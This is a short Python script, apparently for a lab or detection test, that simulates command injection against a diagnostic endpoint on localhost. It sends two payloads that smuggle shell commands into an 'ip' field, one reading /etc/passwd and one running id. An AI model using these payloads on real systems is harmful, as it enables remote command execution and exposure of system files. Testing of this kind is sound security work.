import time
import requests

# Command Injection (RCE) Simulation Script
TARGET_URL = "http://localhost:5001/diagnostic"

def run_rce_attack():
    print("[*] Launching Command Injection (RCE) simulation...")
    
    rce_payloads = [
        {"ip": "127.0.0.1; cat /etc/passwd"},
        {"ip": "127.0.0.1 | id"}
    ]
    
    for i, payload in enumerate(rce_payloads, 1):
        try:
            res = requests.post(TARGET_URL, data=payload, timeout=3)
            print(f"[+] Sent RCE payload #{i} to {TARGET_URL} | Status: {res.status_code}")
        except Exception as e:
            print(f"[-] RCE test #{i}: Event generated ({e})")
        
        time.sleep(1)

if __name__ == "__main__":
    run_rce_attack()